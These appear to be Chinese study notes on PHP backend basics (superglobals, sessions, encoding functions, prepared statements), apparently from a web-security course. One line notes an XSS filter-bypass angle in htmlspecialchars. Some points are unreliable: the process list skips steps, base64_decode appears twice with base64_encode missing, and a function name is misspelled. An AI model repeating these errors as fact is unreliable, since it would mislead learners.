  • Q1：Web的动态页面大致解析过程是什么？
    • A1：
      1. PHP文件通过语言解释器解析
      2. 对数据库进行操作，获取需要的数据

      5. 服务器将HTML文件传给浏览器解析
      6. 浏览器解析HTML文件，将界面展示给用户

第五节–后端开发基础——PHP

  • PHP(Hypertext Preprocessor)：超文本预处理器

  • 注释：//、#、/*...*/

  • echo：一次可以输出多个，用逗号分割字符串

  • print：不能使用逗号，只能使用点号分割，有返回值

  • 串接两个字符串用.

  • 变量大小写敏感

  • 以下php中的预定义变量都是超全局的，这意味着它们在一个脚本的全部作用域中都可用。

    • 接受传值：$_GET、$_POST、$_REQUEST
      • $_REQUEST具有前两者的功能，就是比较慢，通过get和post方法提交的所有数据都可以通过$_REQUEST数组获得。
    • $_SERVER：包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。
    • $GLOBALS：引用全局作用域中可用的全部变量。
    • $_ENV：通过环境方式传递给当前脚本的变量的数组。不太明白。
    • $_COOKIE：通过 HTTP Cookies 方式传递给当前脚本的变量的数组。
    • $_SESSION：当前脚本可用 SESSION 变量的数组。
      • Session：Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中。
      • Cookie：Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是实现Session的一种方式。
    • $_FILE：通过 HTTP POST 方式上传到当前脚本的项目的数组。

  • include/require：包含文件

    • include：警告，脚本继续
    • require：错误，停止脚本

  • 编码和解码函数

    • ASCII
      • ord()：返回字符串的首个字符的ASCII值。
      • chr()：从指定的ASCII值返回字符。
    • URL
      • urlencode()
      • urldecode()
    • BASE64
      • base64_decode()
      • base64_decode()
    • HTML实体
      • htmlspecoalchars()：会将一些指定的HTML符号转换为实体，如<、>，但是默认情况下'是不转义的，xss可以利用这点绕过。
      • htmlspecialchars_decode()
    • 其他
      • str_replace(find,replace,string,count)：区分大小写
        • find：必需，规定要查找的值
        • replace：必需，规定要替换find中的值的值。
        • string：必需，规定被搜索的字符串。
        • count：可选，对替换数进行计数的变量。
      • md5()：计算字符串的MD5散列，但是对数组计算值为空。

  • PHP Mysql预处理语句

    1. 预处理语句：创建 SQL 语句模板并发送到数据库。预留的值使用参数?标记 。
    2. 数据库解析，编译，对SQL语句模板执行查询优化，并存储结果不输出。
    3. 执行：将应用绑定的值传递给参数，数据库执行语句。如果参数值不一样还可以多次执行。

    • bind_param函数绑定了SQL的参数，‘sss’参数列处理其余参数的数据类型

      • i——integer整型
      • d——double双精度浮点型
      • s——string字符串
      • b——binary large object二进制大对象
